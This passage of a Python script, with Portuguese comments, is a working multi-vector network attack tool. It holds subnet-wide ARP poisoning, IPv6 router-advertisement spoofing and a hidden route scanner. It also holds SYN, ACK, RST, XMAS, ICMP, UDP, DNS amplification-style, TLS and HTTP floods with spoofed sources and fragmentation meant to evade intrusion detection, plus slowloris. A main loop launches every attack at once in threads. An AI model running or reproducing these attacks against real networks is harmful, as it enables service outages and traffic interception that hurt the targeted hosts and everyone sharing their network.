with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
    vuln_paths = [line.strip() for line in f if line.strip() and not line.startswith("#")]

# Arquivo de saída com rotas que responderam
output_file = "rotas_existentes.txt"

# Função que testa as rotas e salva as válidas
def rotas_existentes_scan():
    for path in vuln_paths:
        try:
            full_url = f"{TARGET_URL.rstrip('/')}/{path.lstrip('/')}"
            r = requests.get(full_url, timeout=3, verify=False)

            if r.status_code in [200, 403]:  # 403 pode indicar arquivo protegido mas existente
                with open(output_file, "a") as f_out:
                    f_out.write(f"{full_url}\n")

        except:
            continue

# Executa em thread furtiva (paralelo ao ataque ou outro scanner)
threading.Thread(target=rotas_existentes_scan, daemon=True).start()

def RandString(size=32):
    return ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=size)).encode()

def random_mac():
    """Gera MAC address mutante"""
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0x00, 0xFF) for _ in range(5))

def build_aggressive_arp(src_ip, dst_ip):
    """Pacote ARP malformado com MAC spoofing constante"""
    fake_mac = random_mac()
    dst_mac = random.choice([
        "ff:ff:ff:ff:ff:ff",  # broadcast
        random_mac()          # aleatório
    ])
    
    pkt = Ether(dst=dst_mac, src=fake_mac) / ARP(
        op=2,
        psrc=src_ip,
        pdst=dst_ip,
        hwsrc=fake_mac,
        hwlen=random.choice([6, 7, 5]),  # Headers aleatórios
        plen=random.choice([4, 3, 5])
    )
    
    # Padding bruto em todos os pacotes
    pkt = pkt / os.urandom(random.randint(30, 90))
    return pkt

def arp_poison():
    """
    ARP poisoning ultra agressivo e brutal.
    MAC mutante, spoof total, flood massivo, pacotes malformados e entropia alta.
    """
    global running
    print("[*] Modo ARP Agressivo Ativado")
    
    while running:
        try:
            # Envia múltiplos pacotes por iteração (burst mode)
            for _ in range(6):  # Burst count
                p1 = build_aggressive_arp(GATEWAY_IP, TARGET_IP)
                p2 = build_aggressive_arp(TARGET_IP, GATEWAY_IP)

                sendp(p1, verbose=0)
                sendp(p2, verbose=0)
                stats["arp"] += 2

            # Jitter mínimo com entropia
            time.sleep(random.uniform(0.001, 0.01))  # Sub-millisecond jitter

        except Exception:
            # Nenhum log, completamente silencioso
            continue
def arp_poison_nuclear():
    """
    ARP Poisoning em toda a sub-rede (modo nuclear).
    - Envia spoof ARP para todos os IPs de 192.168.0.1 a 192.168.0.254
    - MAC spoofing em cada pacote
    - Headers ARP malformados aleatórios
    - Padding bruto com entropia alta
    - Bidirecional: spoofa como gateway e como alvo
    """
    global running
    print("[*] Modo ARP Nuclear Ativado - Spoofando toda a subnet...")

    def random_mac():
        return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))

    def build_aggressive_arp(src_ip, dst_ip):
        fake_mac = random_mac()
        dst_mac = random.choice([
            "ff:ff:ff:ff:ff:ff",
            random_mac(),
            "ff:ff:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(4))
        ])

        pkt = Ether(dst=dst_mac, src=fake_mac) / ARP(
            op=random.choice([1, 2]),
            psrc=src_ip,
            pdst=dst_ip,
            hwsrc=fake_mac,
            hwlen=random.choice([5, 6, 7]),
            plen=random.choice([3, 4, 5])
        ) / os.urandom(random.randint(40, 100))

        return pkt

    def generate_subnet_ips(base="192.168.0.", start=1, end=254):
        return [f"{base}{i}" for i in range(start, end+1) if f"{base}{i}" != TARGET_IP]

    all_targets = generate_subnet_ips()

    while running:
        try:
            for ip in random.sample(all_targets, len(all_targets)):
                p1 = build_aggressive_arp(GATEWAY_IP, ip)
                p2 = build_aggressive_arp(ip, GATEWAY_IP)

                sendp(p1, verbose=0)
                sendp(p2, verbose=0)
                stats["arp"] += 2

            time.sleep(random.uniform(0.001, 0.01))  # Agressivo, mas não 0

        except Exception:
            continue  # Silencioso total
def ipv6_ra_spoof():
    """
    Spoofa Router Advertisement IPv6 (Neighbor Discovery) — destrói rotas em IPv6.
    """
    from scapy.all import Ether, IPv6, ICMPv6ND_RA, sendp
    global running
    print("[*] IPv6 Router Advertisement Spoof Ativado")

    while running:
        try:
            fake_mac = random_mac()
            ra = Ether(dst="33:33:00:00:00:01", src=fake_mac) / \
                 IPv6(dst="ff02::1", src="fe80::1") / \
                 ICMPv6ND_RA()

            sendp(ra / os.urandom(random.randint(20, 100)), verbose=0)
            stats["arp"] += 1
            time.sleep(random.uniform(0.01, 0.05))
        except:
            continue
def cdp_lldp_fake():
    """
    Envia pacotes falsos CDP/LLDP (camada 2) para confundir switches Cisco e similares.
    """
    from scapy.all import Ether, Raw, sendp
    global running
    print("[*] CDP/LLDP spoof ativado")

    while running:
        try:
            pkt = Ether(dst="01:80:c2:00:00:0e", type=0x88cc) / Raw(load=os.urandom(random.randint(60, 150)))
            sendp(pkt, verbose=0)
            stats["arp"] += 1
            time.sleep(random.uniform(0.01, 0.03))
        except:
            continue
def shadow_arp_attack():
    """
    Spoofa IPs entre si dentro da rede, criando rotas zumbis e loop de confusão entre hosts.
    """
    from scapy.all import Ether, ARP, sendp
    global running
    print("[*] Shadow ARP Attack Iniciado")

    ip_range = [f"192.168.0.{i}" for i in range(1, 255) if f"192.168.0.{i}" != TARGET_IP]

    while running:
        try:
            src_ip = random.choice(ip_range)
            dst_ip = random.choice([ip for ip in ip_range if ip != src_ip])
            fake_mac = random_mac()

            pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=fake_mac) / ARP(
                op=2,
                psrc=src_ip,
                pdst=dst_ip,
                hwsrc=fake_mac
            ) / os.urandom(random.randint(20, 80))

            sendp(pkt, verbose=0)
            stats["arp"] += 1
            time.sleep(random.uniform(0.005, 0.02))
        except:
            continue
def rarp_garp_mode():
    """
    Envia pacotes RARP e GARP com headers entropizados para confundir cache ARP e switches.
    """
    from scapy.all import Ether, ARP, sendp
    global running
    print("[*] RARP/GARP Mode ON")

    while running:
        try:
            mac = random_mac()
            garp = Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) / ARP(op=2, psrc=TARGET_IP, pdst=TARGET_IP, hwsrc=mac)
            rarp = Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) / ARP(op=3, psrc=GATEWAY_IP, pdst=TARGET_IP, hwsrc=mac)
            sendp(garp / os.urandom(random.randint(10, 60)), verbose=0)
            sendp(rarp / os.urandom(random.randint(10, 60)), verbose=0)
            stats["arp"] += 2
            time.sleep(random.uniform(0.01, 0.05))
        except:
            continue

def spoofed_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def icmp_payload():
    size = random.randint(32, 256)
    return Raw(load=os.urandom(size))

def build_icmp_packet():
    ip_layer = IP(
        src=spoofed_ip(),
        dst=TARGET_IP,
        ttl=random.randint(32, 128),
        id=random.randint(1, 65535),
        flags=random.choice(['DF', 0])
    )

    icmp_layer = ICMP(
        type=8, code=0,
        id=random.randint(0, 0xffff),
        seq=random.randint(0, 0xffff)
    )

    return ip_layer / icmp_layer / icmp_payload()

def icmp_flood_worker(thread_id):
    global stats
    while True:
        packet = build_icmp_packet()
        send(packet, verbose=0)
        stats["icmp"] += 1

        if stats["icmp"] % 1000 == 0:
            print(f"[Thread {thread_id}] Total ICMP enviados: {stats['icmp']}")

        #time.sleep(1 / PACKETS_PER_SECOND)
        pass
def icmp_flood():
    for i in range(10):  # ou use THREADS se preferir
        t = threading.Thread(target=icmp_flood_worker, args=(i,))
        t.daemon = True
        t.start()

def fragmented_attack():
    while True:
        pkt = IP(dst=TARGET_IP, flags="MF")/UDP(dport=TARGET_PORT)/Raw(load="X"*600)
        send(pkt, verbose=0)

def syn_flood():
      while True:
        try:
            # Camada IP com obfuscação
            ip_layer = IP(
                src=str(RandIP()),
                dst=TARGET_IP,
                ttl=random.randint(32, 255),
                id=random.randint(1, 65535),
                flags=random.choice(["DF", "MF", 0])
            )

            # Flags randômicas: mistura SYN + extras (bypass)
            flag_combos = ["S", "S", "S", "S", "SF", "S", "S", "S", "S", "S", "S", "S", "SU", "SE", "SR", "S"]
            flags = random.choice(flag_combos)

            # TCP Options com entropia alta (variações agressivas)
            options = [
                ("MSS", random.choice([1220, 1337, 1460, 1380])),
                ("WScale", random.randint(1, 15)),
                ("NOP", None),
                ("SAckOK", b""),
                ("Timestamp", (random.randint(1, 999999), 0)),
                ("AltChkSum", random.randint(1, 255))
            ]
            random.shuffle(options)

            # Camada TCP com obfuscação total
            tcp_layer = TCP(
                sport=RandShort(),
                dport=TARGET_PORT,
                flags=flags,
                seq=random.randint(0, 0xFFFFFFFF),
                window=random.randint(512, 65535),
                urgptr=random.randint(0, 10000),
                options=options[:random.randint(2, 6)]
            )

            # Payload ofuscado (usado para despistar firewalls/DPI)
            payload = Raw(load=os.urandom(random.randint(16, 128)))

            # Combina tudo
            packet = ip_layer / tcp_layer / payload

            # Fragmentação aleatória (evita reassembly)
            if random.random() > 0.6:
                fragments = fragment(packet, fragsize=random.choice([8, 16, 24]))
                for frag in fragments:
                    send(frag, verbose=0)
            else:
                send(packet, verbose=0)

            stats["syn"] += 1

            if stats["syn"] % 1000 == 0:
                print(f"🧨 [SYN-INSANO] Enviados: {stats['syn']}")

        except Exception:
            stats["fails"] += 1



# Versão simples
def ack_flood():
    while True:
        send(IP(dst=TARGET_IP, src=RandIP()) / TCP(dport=TARGET_PORT, flags="A"), verbose=0)
        stats["ack"] += 1

# Versão poderosa com bypass
def powerful_ack_flood():
    while True:
        src_ip = RandIP()
        src_port = RandShort()
        dst_port = random.choice([80, 443, 8080, TARGET_PORT])  # varia portas destino

        # Payload aleatório entre 20 e 100 bytes
        payload = os.urandom(random.randint(20, 100))

        # Cria o pacote com spoofing e payload
        packet = IP(dst=TARGET_IP, src=src_ip) / TCP(sport=src_port, dport=dst_port, flags="A") / Raw(load=payload)

        send(packet, verbose=0)
        stats["ack"] += 1

# Dispara múltiplas threads
def start_attack():
    for _ in range(THREADS):
        t = threading.Thread(target=powerful_ack_flood)
        t.daemon = True
        t.start()

    print(f"Ataque iniciado com {THREADS} threads. Pressione Ctrl+C para parar.")
    while True:
        time.sleep(1)

def rst_attack():
    while True:
        send(IP(dst=TARGET_IP, src=RandIP())/TCP(dport=TARGET_PORT, sport=RandShort(), flags="R"), verbose=0)
        stats["rst"] += 1

# Estatísticas
stats.setdefault("rst", 0)


def powerful_rst_attack():
    while True:
        src_ip = RandIP()
        src_port = RandShort()
        dst_port = random.choice([80, 443, 8080, TARGET_PORT])
        seq_num = random.randint(1000, 999999)

        # Flags variando entre R, RA, ou apenas R
        tcp_flags = random.choice(["R", "RA", "R"])

        # Payload simula lixo de rede
        payload = os.urandom(random.randint(20, 80))

        # Monta pacote
        packet = IP(dst=TARGET_IP, src=src_ip) / TCP(sport=src_port, dport=dst_port, flags=tcp_flags, seq=seq_num) / Raw(load=payload)

        # Fragmenta o pacote para bypass de IDS
        fragmented = fragment(packet)

        for frag in fragmented:
            send(frag, verbose=0)

        stats["rst"] += 1

        # Delay aleatório entre pacotes (evita padrão fácil de detectar)
        time.sleep(random.uniform(0.01, 0.1))

# Executor em múltiplas threads
def start_rst_attack(threads=THREADS):
    for _ in range(threads):
        t = threading.Thread(target=powerful_rst_attack)
        t.daemon = True
        t.start()

    print(f"RST attack avançado iniciado com {threads} threads.")
    while True:
        time.sleep(1)

def xmas_flood():
    while True:
        send(IP(dst=TARGET_IP, src=RandIP())/TCP(dport=TARGET_PORT, flags="FPU"), verbose=0)
        stats["xmas"] += 1

def powerful_xmas_flood():
    while True:
        src_ip = RandIP()
        src_port = RandShort()
        dst_port = random.choice([80, 443, 8080, TARGET_PORT])  # porta destino variada
        seq = random.randint(1000, 999999)

        # Flags principais + variação moderna para evasão
        flags = random.choice(["FPU", "FP", "PU", "FU", "FPUA", "FPU", "F"])  # misto

        # Payload randômico (pode causar parsing estranho)
        payload = os.urandom(random.randint(16, 64))

        # Cria pacote
        packet = IP(dst=TARGET_IP, src=src_ip) / TCP(sport=src_port, dport=dst_port, flags=flags, seq=seq) / Raw(load=payload)

        # Fragmenta pacote para evasão
        for frag in fragment(packet):
            send(frag, verbose=0)

        stats["xmas"] += 1

        # Delay aleatório (evade padrões)
        time.sleep(random.uniform(0.01, 0.07))

# Executor com múltiplas threads
def start_xmas_attack(threads=THREADS):
    for _ in range(threads):
        t = threading.Thread(target=powerful_xmas_flood)
        t.daemon = True
        t.start()

    print(f"XMAS flood iniciado com {threads} threads. Pressione Ctrl+C para parar.")
    while True:
        pass

def udp_flood():
    while True:
        send(IP(dst=TARGET_IP)/UDP(dport=TARGET_PORT)/Raw(load="X"*randint(10, 1024)), verbose=0)
        stats["udp"] += 1

# --- Camada 5/6: Sessão/Apresentação (TLS Handshake Flood Simulado) ---
def tls_handshake_flood():
     while True:
        try:
            # Criação do socket com performance agressiva
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)  # Envia os dados imediatamente
            s.settimeout(0.5)  # Timeout curto para acelerar tentativas
            s.connect((TARGET_IP, TARGET_PORT))

            # Geração do pacote TLS ClientHello com pequenas variações
            client_hello = bytearray.fromhex(
                "16030100d1010000cd0303" +         # TLS Record + Handshake Header
                os.urandom(32).hex() +             # Random (timestamp + random)
                "0020" +                           # Session ID Length
                os.urandom(32).hex() +             # Session ID
                "c02f00ff" +                       # Cipher Suites
                "0100" +                           # Compression Methods
                "002300000000000000"               # Extensions (placeholder)
            )

            s.sendall(client_hello)  # Envia todo o pacote
            stats["tls"] += 1
            s.close()

        except:
            stats["fails"] += 1
def http_flood_advanced():
    user_agents = [
        "Mozilla/5.0",
        "Chrome/107.0",
        "Safari/537.36",
        "Opera/9.80",
        "Edge/18.18363",
        "curl/7.68.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:118.0) Gecko/20100101 Firefox/118.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Opera/12.16",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/18.18363",
        "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E1",
        "Mozilla/5.0 (Linux; U; Android 10; en-us; SM-A505F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Vivaldi/3.8 Chrome/89.0.4389.128 Safari/537.",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Brave/123.0.0.0 Chrome/123.0.0.0 Safari/537.36",
        "Googlebot/2.1 (+http://www.google.com/bot.html)",
        "Bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
        "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot)",
        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
    ]
    
    methods = ["GET", "POST", "HEAD", "OPTIONS", "PUT"]
    paths = ["/", "/index.html", "/login", "/api", "/status"]
    
    headers_pool = [
        {"Cache-Control": "no-cache"},
        {"X-Custom-Header": "value"},
        {"Accept-Encoding": "gzip, deflate"},
        {"Pragma": "no-cache"},
        {"X-Requested-With": "XMLHttpRequest"},
        {"Transfer-Encoding": "chunked"}
    ]
    
    while True:
        try:
            method = random.choice(methods)
            path = random.choice(paths) + str(random.randint(100, 999))
            full_url = TARGET_URL + path
            headers = {
                "User-Agent": random.choice(user_agents),
                "X-Forwarded-For": str(RandIP()),
                "Referer": f"{TARGET_URL}/ref?id={random.randint(1000, 9999)}",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Upgrade-Insecure-Requests": "1",
                "Cookie": f"session={random.randint(100000, 999999)}"
            }
            headers.update(random.choice(headers_pool))

            params = {"r": random.randint(1000, 9999)}
            
            # Se quiser usar proxy:
            # proxies = {"http": "http://127.0.0.1:9050", "https": "http://127.0.0.1:9050"}
            # requests.request(..., proxies=proxies)

            if method in ["GET", "HEAD", "OPTIONS"]:
                requests.request(method, full_url, headers=headers, params=params, timeout=2)
            else:
                data = {"data": "X" * random.randint(10, 200)}
                requests.request(method, full_url, headers=headers, params=params, data=data, timeout=2)
            
            stats["http"] += 1
            time.sleep(0.01)  # delay mais humano
        except requests.exceptions.RequestException:
            stats["fails"] += 1


def dns_flood():
    while True:
        pkt = IP(dst=TARGET_IP)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=DNS_TARGET))
        send(pkt, verbose=0)
        stats["dns"] += 1

def powerful_dns_flood():

    dns_types = ["A", "AAAA", "MX", "NS", "TXT", "ANY", "SOA", "CNAME", "PTR"]
    charset = "abcdefghijklmnopqrstuvwxyz0123456789-%_@$!"

    while True:
        try:
            # 1. Spoofing IP e porta
            src_ip = RandIP()
            src_port = RandShort()
            dst_port = 53

            # 2. Subdomínio randômico (longo, entropia alta, bypass de cache)
            subdomain = ".".join([
                ''.join(random.choices(charset, k=random.randint(10, 20)))
                for _ in range(random.randint(2, 6))
            ]) + f".{DNS_TARGET}"

            # 3. Escolha de tipo com peso para ANY
            qtype = random.choices(dns_types, weights=[1,1,1,1,1,8,1,1,1])[0]

            # 4. Construção de DNS Query Layer com entropia
            dns_qd = DNSQR(qname=subdomain, qtype=qtype)
            for _ in range(random.randint(2, 6)):
                extra_qname = ".".join([
                    ''.join(random.choices(charset, k=random.randint(6, 14)))
                    for _ in range(2)
                ]) + f".{DNS_TARGET}"
                dns_qd /= DNSQR(qname=extra_qname, qtype=random.choice(dns_types))

            # 5. EDNS0 falso para bypass de middlebox
            edns_fake = DNSRROPT(
                rclass=random.choice([4096, 2048, 1024]),
                version=random.randint(0, 1),
                z=random.randint(0, 0xFFFF),
                rdlen=0
            )

            # 6. Fake answer section
            fake_answer = DNSRR(
                rrname=subdomain,
                type="A",
                rclass="IN",
                ttl=random.randint(0, 5),
                rdata=RandIP()
            )

            # 7. Camada RAW adicional (payload aleatório)
            raw_payload = Raw(load=RandString(size=random.randint(32, 128)))

            # 8. Camada IP aleatória (flags, TTL, ID)
            ip_layer = IP(
                dst=TARGET_IP,
                src=src_ip,
                id=random.randint(0, 65535),
                ttl=random.randint(32, 255),
                flags=random.choice(["DF", "MF", 0])
            )

            # 9. UDP spoof sem checksum
            udp_layer = UDP(
                sport=src_port,
                dport=dst_port,
                chksum=0
            )

            # 10. DNS Header entropia
            dns_layer = DNS(
                id=random.randint(0, 65535),
                qr=0,
                rd=1,
                qdcount=random.randint(2, 8),
                ancount=1,
                arcount=1,
                qd=dns_qd,
                an=fake_answer,
                ar=edns_fake
            )

            # 11. Montagem completa do pacote
            pkt = ip_layer / udp_layer / dns_layer / raw_payload

            # 12. Fragmentação manual com sobreposição e reversão
            fragsize = random.randint(8, 32)
            fragments = fragment(pkt, fragsize=fragsize)

            if random.random() < 0.5:
                fragments.reverse()

            # 13. Envio dos fragmentos
            for frag in fragments:
                send(frag, verbose=0)

            stats["dns"] += 1

        except Exception as e:
            stats["fails"] += 1
            continue



def slowloris():
    user_agents = [
        "Mozilla/5.0", "Chrome/113.0", "curl/7.68.0",
        "Safari/537.36", "Opera/9.80", "Lynx/2.8.9dev.16"
    ]

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((TARGET_IP, TARGET_PORT))

            # Requisição inicial parcialmente enviada
            s.send(f"GET /?{random.randint(1,1000)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {DNS_TARGET}\r\n".encode())
            s.send(f"User-Agent: {random.choice(user_agents)}\r\n".encode())
            s.send("Content-Type: application/x-www-form-urlencoded\r\n".encode())

            # Envia headers lentamente, mantendo a conexão presa
            for _ in range(random.randint(15, 30)):
                header = f"X-a{random.randint(1, 9999)}: {random.randint(1,999999)}\r\n"
                s.send(header.encode())
                time.sleep(random.uniform(0.5, 2.5))  # jitter maior = evasivo

            try:
                s.shutdown(socket.SHUT_RDWR)
                s.close()
            except:
                pass

            stats["slowloris"] += 1

        except socket.error:
            stats["fails"] += 1
  

def monitor():
    time.sleep(1)  # Corrigido: estava fora do lugar
    last_stats = stats.copy()
    last_time = time.time()

    ascii_wifite = f"""{CYAN}
 .´  ·  .     .  ·  `.   Criador:Samuel Rodrigues Silva Lima
 :  :  :  (¯)  :  :  :   Uso dessa ferramenta de forma etica!!!!!
 `.  ·  ` /¯\\ ´  ·  .´  Canal do youtube:BlackSamurai
   `     /¯¯¯\\     ´    
{RESET}"""

    banner = f"""{RED}
╔═════════════════════════════════════════════════════════════════╗
║                    ████ MONITOR TÁTICO ████                    ║
║                 BlackHat Ops | Deep Packet Unit                ║
╚═════════════════════════════════════════════════════════════════╝
{RESET}"""

    while True:
        time.sleep(2)
        now = time.time()
        elapsed = now - last_time
        last_time = now

        delta = {k: stats[k] - last_stats.get(k, 0) for k in stats}
        last_stats = stats.copy()

        total_sent = sum([v for k, v in delta.items() if k != "fails"])
        fails = delta.get("fails", 0)
        total_now = total_sent + fails

        pps = total_sent / elapsed if elapsed > 0 else 0
        fail_rate = (fails / total_now) * 100 if total_now > 0 else 0

        os.system('clear')  # ou 'cls' no Windows
        print(ascii_wifite)
        print(banner)
        print(f"{GREEN}📡 [STATUS] Taxa de Envio: {pps:.2f} pkts/s | Falhas: {fails} ({fail_rate:.1f}%) | Ciclo: {elapsed:.2f}s{RESET}")

        print(f"""{YELLOW}
╓────┤ PACOTES ENVIADOS ├────────────────────────────────────────╖
║ ICMP: {stats['icmp']:>7}   SYN: {stats['syn']:>7}   UDP: {stats['udp']:>7} ║
║ HTTP: {stats['http']:>7}   DNS: {stats['dns']:>7}   TLS: {stats['tls']:>7} ║
║ RST: {stats['rst']:>7}   ACK: {stats['ack']:>7}   XMAS: {stats['xmas']:>7} ║
║ ARP: {stats['arp']:>7}   SLOWLORIS: {stats['slowloris']:>7}             ║
╙────────────────────────────────────────────────────────────────╜
{RESET}""")

        # ALERTAS INTELIGENTES
        if fail_rate > 70 and stats["http"] > 0:
            print(f"{RED}🔥🔥 [CRÍTICO] O servidor pode estar offline ou bloqueando ativamente!{RESET}")
        elif fail_rate > 40:
            print(f"{YELLOW}⚠️  [ALERTA] Alto índice de falhas, possíveis filtros ou lentidão detectada.{RESET}")
        elif total_sent == 0:
            print(f"{RED}⛔ [FALHA] Nenhum pacote foi enviado. Verifique permissões ou rede.{RESET}")
        elif pps < 10:
            print(f"{YELLOW}🐢 [DEVAGAR] Baixa taxa de pacotes. Rede lenta ou alvo congestionado.{RESET}")
        else:
            print(f"{GREEN}✅ [OK] Envio estável. Sem anomalias detectadas.{RESET}")








attack_functions = [
    arp_poison,
    icmp_flood,
    fragmented_attack,
    syn_flood,
    powerful_ack_flood,
    powerful_rst_attack,
    powerful_xmas_flood,
    udp_flood,
    tls_handshake_flood,
    http_flood_advanced,
    powerful_dns_flood,
    slowloris,
    arp_poison_nuclear,
    ipv6_ra_spoof,
    cdp_lldp_fake,
    shadow_arp_attack,
    rarp_garp_mode,
    monitor  # ← monitor sempre por último
]

if __name__ == "__main__":
    collect_target_info()  # ← 
for func in attack_functions:
    t = threading.Thread(target=func)
    t.daemon = True
    t.start()

while True:
    time.sleep(0.1)
